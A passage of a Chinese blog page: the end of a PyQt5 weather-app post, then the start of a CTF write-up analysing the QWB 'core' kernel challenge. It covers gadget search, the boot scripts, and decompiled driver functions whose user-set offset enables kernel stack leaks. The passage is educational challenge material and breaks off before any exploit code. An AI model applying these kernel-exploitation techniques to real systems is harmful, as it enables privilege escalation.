class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtCore, QtGui, QtWidgets</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mainweather</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,parent=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Mainweather, self).__init__(parent)</span><br><span class="line">        self.setWindowFlags(Qt.SubWindow)</span><br><span class="line">        self.ui = UI_Form()</span><br><span class="line">        self.ui.setupUI(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">queryWeather</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* queryWeather &#x27;</span>)</span><br><span class="line">        cityName = self.ui.weatherComboBox.currentText()</span><br><span class="line">        cityCode = self.transCityName(cityName)</span><br><span class="line"></span><br><span class="line">        rep = requests.get(<span class="string">&#x27;http://www.weather.com.cn/data/sk/&#x27;</span>+cityCode+<span class="string">&#x27;.html&#x27;</span>)</span><br><span class="line">        rep.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(rep.json())</span><br><span class="line"></span><br><span class="line">        msg1 = (<span class="string">&#x27;城市: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;city&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg2 = (<span class="string">&#x27;风向: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WD&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg3 = (<span class="string">&#x27;温度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;temp&#x27;</span>] + <span class="string">&quot; 度&quot;</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg4 = (<span class="string">&#x27;风力: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WS&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg5 = (<span class="string">&#x27;湿度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;SD&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">        result = msg1+msg2+msg3+msg4+msg5</span><br><span class="line">        self.ui.resultText.setText(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">transCityName</span>(<span class="params">self,cityName</span>):</span></span><br><span class="line">        cityCode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> cityName == <span class="string">&#x27;成都&#x27;</span>:</span><br><span class="line">            cityCode = <span class="string">&#x27;101270101&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> cityName == <span class="string">&#x27;南充&#x27;</span>:</span><br><span class="line">            cityCode = <span class="string">&#x27;101270501&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> cityCode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clearResult</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* clearResult &#x27;</span>)</span><br><span class="line">        self.ui.resultText.clear()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitWindows</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* quitWindows &#x27;</span>)</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UI_Form</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setupUI</span>(<span class="params">self,Form</span>):</span></span><br><span class="line">        Form.setObjectName(<span class="string">&quot;Form&quot;</span>)</span><br><span class="line">        Form.resize(<span class="number">450</span>,<span class="number">350</span>)</span><br><span class="line"></span><br><span class="line">        self.groupBox = QtWidgets.QGroupBox(Form)</span><br><span class="line">        self.groupBox.setGeometry(QtCore.QRect(<span class="number">10</span>,<span class="number">10</span>,<span class="number">250</span>,<span class="number">250</span>))</span><br><span class="line">        self.groupBox.setObjectName(<span class="string">&quot;groupBox&quot;</span>)</span><br><span class="line">        self.groupBox.setStyleSheet(<span class="string">&quot;color:white&quot;</span>)</span><br><span class="line">        self.weatherComboBox = QtWidgets.QComboBox(self.groupBox)</span><br><span class="line">        self.weatherComboBox.setGeometry(QtCore.QRect(<span class="number">80</span>,<span class="number">30</span>,<span class="number">140</span>,<span class="number">21</span>))</span><br><span class="line">        self.weatherComboBox.addItem(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        self.weatherComboBox.addItem(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        self.weatherComboBox.setStyleSheet(<span class="string">&quot;color:black&quot;</span>)</span><br><span class="line">        self.resultText = QtWidgets.QTextEdit(self.groupBox)</span><br><span class="line">        self.resultText.setGeometry(QtCore.QRect(<span class="number">10</span>,<span class="number">60</span>,<span class="number">220</span>,<span class="number">181</span>))</span><br><span class="line">        self.resultText.setObjectName(<span class="string">&quot;resultText&quot;</span>)</span><br><span class="line">        self.resultText.setFont(QFont(<span class="string">&quot;微软雅黑&quot;</span>,<span class="number">12</span>,QFont.Bold))</span><br><span class="line">        self.resultText.setStyleSheet(<span class="string">&quot;color:black&quot;</span>)</span><br><span class="line">        self.label = QtWidgets.QLabel(self.groupBox)</span><br><span class="line">        self.label.setGeometry(QtCore.QRect(<span class="number">20</span>,<span class="number">20</span>,<span class="number">72</span>,<span class="number">21</span>))</span><br><span class="line">        self.label.setObjectName(<span class="string">&quot;laber&quot;</span>)</span><br><span class="line">        self.okButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.okButton.setGeometry(QtCore.QRect(<span class="number">50</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.okButton.setObjectName(<span class="string">&quot;okButton&quot;</span>)</span><br><span class="line">        self.clearButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.clearButton.setGeometry(QtCore.QRect(<span class="number">160</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.clearButton.setObjectName(<span class="string">&quot;clearButton&quot;</span>)</span><br><span class="line">        self.quitButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.quitButton.setGeometry(QtCore.QRect(<span class="number">270</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.quitButton.setObjectName(<span class="string">&quot;quitButton&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.retranslateUI(Form)</span><br><span class="line">        self.okButton.clicked.connect(Form.queryWeather)</span><br><span class="line">        self.clearButton.clicked.connect(Form.clearResult)</span><br><span class="line">        self.quitButton.clicked.connect(Form.quitWindows)</span><br><span class="line"></span><br><span class="line">        QtCore.QMetaObject.connectSlotsByName(Form)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">retranslateUI</span>(<span class="params">self,Form</span>):</span></span><br><span class="line">        _translate = QtCore.QCoreApplication.translate</span><br><span class="line">        Form.setWindowTitle(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;天气预报&quot;</span>))</span><br><span class="line">        self.groupBox.setTitle(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;查询城市天气&quot;</span>))</span><br><span class="line">        self.weatherComboBox.setItemText(<span class="number">0</span>,_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;成都&quot;</span>))</span><br><span class="line">        self.weatherComboBox.setItemText(<span class="number">1</span>,_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;南充&quot;</span>))</span><br><span class="line">        self.label.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;城市&quot;</span>))</span><br><span class="line">        self.okButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;查询&quot;</span>))</span><br><span class="line">        self.clearButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;清空&quot;</span>))</span><br><span class="line">        self.quitButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;退出&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    win = Mainweather()</span><br><span class="line">    palette = QPalette()</span><br><span class="line">    palette.setBrush(QPalette.Background, QBrush(QPixmap(<span class="string">&quot;D:\PythonProject\images\YHellow.png&quot;</span>)))</span><br><span class="line">    win.setPalette(palette)</span><br><span class="line">    win.show()</span><br><span class="line"></span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li><p>version：v1.1</p>
</li>
<li><p>date：2022.5.13</p>
</li>
<li><p>type：</p>
<ul>
<li>Features：<ul>
<li>导入了图片背景</li>
<li>修改了字体和颜色</li>
</ul>
</li>
<li>Changed：<ul>
<li>对部分代码进行了调整，使其更易读</li>
</ul>
</li>
<li>Removed：NULL</li>
</ul>
</li>
<li><p>desc：</p>
<ul>
<li>目前该项目以完善，在很长一段时间里可能都不会再碰该项目</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/12/my%20first%20kernel%20pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/12/my%20first%20kernel%20pwn/" class="post-title-link" itemprop="url">my first kernel pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-12 19:24:17" itemprop="dateCreated datePublished" datetime="2022-05-12T19:24:17+08:00">2022-05-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-04 23:13:02" itemprop="dateModified" datetime="2022-06-04T23:13:02+08:00">2022-06-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>core  复现</strong></p>
<p>文件如下：</p>
<ul>
<li>bzImage：压缩的内核映像 </li>
<li>core.cpio：文件系统映像 </li>
<li>start.sh：用于启动 kernel 的 shell 的脚本 </li>
<li>vmlinux：静态链接的可执行文件格式的 Linux 内核</li>
</ul>
<p>如果没有 vmlinux，就需要使用 extract-vmlinux 进行提取，不过我更喜欢用 vmlinux-to-elf：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* vmlinux-to-elf [core.cpio] [vmlinux] */</span></span><br><span class="line">➜  give_to_player vmlinux-to-elf core.cpio vmlinux </span><br><span class="line">[+] Kernel successfully decompressed in-memory (the offsets that follow will be given relative to the decompressed binary)</span><br><span class="line">[+] Version <span class="built_in">string</span>: Linux version <span class="number">4.15</span><span class="number">.8</span> (simple@vps-simple) (gcc version <span class="number">4.8</span><span class="number">.5</span> <span class="number">20150623</span> (Red Hat <span class="number">4.8</span><span class="number">.5</span><span class="number">-16</span>) (GCC)) #<span class="number">20</span> SMP Fri Mar <span class="number">23</span> <span class="number">21</span>:<span class="number">12</span>:<span class="number">32</span> CST <span class="number">2018</span></span><br><span class="line">[+] Guessed architecture: x86_64 successfully in <span class="number">4.66</span> seconds</span><br><span class="line">[+] Found kallsyms_token_table at file offset <span class="number">0x016b5320</span></span><br><span class="line">[+] Found kallsyms_token_index at file offset <span class="number">0x016b5660</span></span><br><span class="line">[+] Found kallsyms_markers at file offset <span class="number">0x016b4de0</span></span><br><span class="line">[+] Found kallsyms_names at file offset <span class="number">0x01635568</span></span><br><span class="line">[+] Found kallsyms_num_syms at file offset <span class="number">0x01635560</span></span><br><span class="line">[i] Negative offsets overall: <span class="number">99.9953</span> %</span><br><span class="line">[i] Null addresses overall: <span class="number">0.0046729</span> %</span><br><span class="line">[+] Found kallsyms_offsets at file offset <span class="number">0x0160b898</span></span><br><span class="line">[+] Successfully wrote the <span class="keyword">new</span> ELF kernel to vmlinux</span><br></pre></td></tr></table></figure>
<ul>
<li>提取出来的 vmlinux 文件没有原版的好用</li>
<li>但是在搜索 gadget 时，尽量使用提取出来的 vmlinux，防止两个 vmlinux 不一样</li>
</ul>
<p>然后使用 Ropper 来寻找 gadget：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player time ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="keyword">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line">ropper --file ./vmlinux --nocolor &gt; g1  <span class="number">77.22</span>s user <span class="number">27.66</span>s system <span class="number">118</span>% cpu <span class="number">1</span>:<span class="number">28.72</span> total</span><br></pre></td></tr></table></figure>
<p>看一下启动脚本 start.sh：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player cat start.sh         </span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m <span class="number">64</span>M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>
<ul>
<li>内核开启了 kaslr 保护</li>
</ul>
<p>尝试启动时我遇见了问题：</p>
<img src="/2022/05/12/my%20first%20kernel%20pwn/1652256707606.png" class width="1652256707606"> 
<ul>
<li>按照 wiki 上的提示，把 start.sh 中的 64M 改为 128M，但是还是无效</li>
<li>于是我改为 256M，成功了</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[    <span class="number">0.023472</span>] Spectre V2 : Spectre mitigation: LFENCE <span class="keyword">not</span> serializing, switchie</span><br><span class="line">udhcpc: started, v1<span class="number">.26</span><span class="number">.2</span></span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending select <span class="keyword">for</span> <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span></span><br><span class="line">udhcpc: lease of <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> obtained, lease time <span class="number">86400</span></span><br><span class="line">/ $ ls</span><br><span class="line">bin          etc          lib          proc         sys          vmlinux</span><br></pre></td></tr></table></figure>
<p>解压 core.cpio：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  core gunzip ./core.cpio.gz </span><br><span class="line">➜  core cpio -idm &lt; ./core.cpio</span><br><span class="line">➜  core ls</span><br><span class="line">bin      etc          init  lib64    proc  sbin  tmp  vmlinux</span><br><span class="line">core.ko  gen_cpio.sh  lib   linuxrc  root  sys   usr</span><br></pre></td></tr></table></figure>
<ul>
<li>发现除了常规的文件目录外，还有个 gen_cpio.sh </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  core cat gen_cpio.sh </span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip <span class="number">-9</span> &gt; $<span class="number">1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这是一个打包的脚本（shell脚本有点看不懂，还要多多学习）</li>
</ul>
<p>看一下 core.cpio-&gt;init：（获取重要信息）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  core cat init               </span><br><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=<span class="number">4</span>,mode=<span class="number">620</span> none /dev/pts</span><br><span class="line">chmod <span class="number">666</span> /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms <span class="comment">// 把kallsyms的内容保存到了/tmp/kallsyms中,那么我们就能从/tmp/kallsyms中读取commit_creds,prepare_kernel_cred的函数的地址了</span></span><br><span class="line">echo <span class="number">1</span> &gt; /proc/sys/kernel/kptr_restrict <span class="comment">// 把kptr_restrict设为&#x27;1&#x27;,这样就不能通过/proc/kallsyms查看函数地址了(但上一行已经把其中的信息保存到了一个可读的文件中,这句就无关紧要了)</span></span><br><span class="line">echo <span class="number">1</span> &gt; /proc/sys/kernel/dmesg_restrict <span class="comment">// 把dmesg_restrict设为&#x27;1&#x27;,这样就不能通过dmesg查看kernel的信息了</span></span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">route add <span class="keyword">default</span> gw <span class="number">10.0</span><span class="number">.2</span><span class="number">.2</span> </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d <span class="number">120</span> -f &amp; <span class="comment">// 设置定时关机,为了避免做题时产生干扰,直接把这句删掉然后重新打包</span></span><br><span class="line">setsid /bin/cttyhack setuidgid <span class="number">1000</span> /bin/sh</span><br><span class="line">echo <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d <span class="number">0</span>  -f</span><br></pre></td></tr></table></figure>
<ul>
<li>/proc/kallsyms 其实是内核符号表，拥有内核符号的地址</li>
</ul>
<p>重新打包后，我们着重分析一下 core.ko 驱动文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  core checksec core.ko </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x0</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>64位，dynamically，开了carnay，开了NX</p>
<img src="/2022/05/12/my%20first%20kernel%20pwn/1652266257344.png" class width="1652266257344"> 
<p>这些函数就是驱动函数，也被称为 ioctl 函数：</p>
<ul>
<li>ioctl 是设备驱动程序中对设备的 I/O 通道进行管理的函数</li>
<li>ioctl 函数是文件结构中的一个属性分量，就是说如果你的驱动程序提供了对 ioctl 的支持，用户就可以在用户程序中使用 ioctl 函数控制设备的 I/O 通道</li>
<li>在驱动程序中实现的 ioctl 函数体内，实际上是有一个 switch{case} 结构，每一个 case 对应一个命令码，做出一些相应的操作，怎么实现这些操作，这是由每一个程序员自己控制的，因为设备都是特定的</li>
</ul>
<p>驱动函数是 kernel 中容易出问题的点，接下来就看看这些函数：</p>
<ul>
<li>init_module：注册了 <code>/proc/core</code> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;16core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>exit_core：删除 <code>/proc/core</code> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">exit_core</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>core_ioctl：定义了三条命令，分别调用 core_read()，core_copy_func() 和设置全局变量 off </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> choice, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( choice )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>: <span class="comment">// 0x6677889B</span></span><br><span class="line">      core_read((<span class="keyword">char</span> *)a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>: <span class="comment">// 0x6677889C</span></span><br><span class="line">      printk(<span class="string">&quot;16core: %d\n&quot;</span>, a3);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>: <span class="comment">// 0x6677889A</span></span><br><span class="line">      printk(<span class="string">&quot;16core: called core_copy\n&quot;</span>);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>core_read：从内核空间 from[off] 拷贝 64 字节到用户空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_read</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *p; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> from[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;16core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;16%d %p\n&quot;</span>, off, a1);</span><br><span class="line">  p = from;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )                      <span class="comment">// 置空64(16*4)位</span></span><br><span class="line">    *p++ = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(from, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(a1, &amp;from[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;                            <span class="comment">// 调用swapgs命令,在gs寄存器的内核与用户态值之间切换，为离开内核做准备</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>core_write：向全局变量 <code>name</code> 上写</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 from, <span class="keyword">unsigned</span> __int64 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(&amp;str1);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">0x800</span> || copy_from_user(&amp;name, from, len) )</span><br><span class="line">    printk(&amp;str2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>core_copy_func：从全局变量 <code>name</code> 中拷贝数据到局部变量中</li>
</ul>
